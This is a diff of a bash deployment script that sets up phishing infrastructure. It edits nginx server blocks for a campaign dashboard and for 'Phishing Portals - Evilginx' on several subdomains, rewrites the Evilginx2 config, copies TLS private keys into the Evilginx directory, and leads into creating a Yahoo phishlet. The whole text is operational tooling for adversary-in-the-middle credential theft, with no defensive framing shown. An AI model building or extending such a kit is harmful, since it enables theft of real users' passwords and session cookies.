@@ -177,6 +177,7 @@ install_dependencies() {
         curl \
         wget \
         build-essential \
+        make \
         unzip \
         jq \
         sqlite3 \
@@ -372,7 +373,6 @@ server {
 # Dashboard - AuthFlow
 server {
     listen 443 ssl;
-    listen [::]:443 ssl;
     http2 on;
     server_name $DOMAIN;
 
@@ -394,7 +394,6 @@ server {
 # Phishing Portals - Evilginx
 server {
     listen 443 ssl;
-    listen [::]:443 ssl;
     http2 on;
     server_name $EP1.$DOMAIN $EP2.$DOMAIN $EP3.$DOMAIN;
 
@@ -525,20 +524,23 @@ start_service() {
 configure_evilginx_integration() {
     log "Configuring Evilginx2 integration..."
 
+    # Copy certificates to Evilginx directory for internal use
+    cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/"
+    cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/"
+
     # Create Evilginx config
     cat > "$EVILGINX_DIR/config.yaml" << EOF
-daemon: false
-debug: false
-version: 3.0.0
-domain: $DOMAIN
-ipv4: 0.0.0.0
-http_port: 8081
-https_port: 8443
-redirect_url: https://www.google.com
-phishlets_path: $EVILGINX_DIR/phishlets
-cert_path: $EVILGINX_DIR/certs
-lures_path: $EVILGINX_DIR/lures
-database: $EVILGINX_DIR/evilginx.db
+daemon = false
+debug = false
+version = 3.0.0
+domain = $DOMAIN
+ipv4 = 0.0.0.0
+http_port = 8081
+https_port = 8443
+redirect_url = https://www.google.com
+phishlets_path = $EVILGINX_DIR/phishlets
+cert_path = $EVILGINX_DIR/certs
+database = $EVILGINX_DIR/evilginx.db
 EOF
 
     # Create Yahoo phishlet
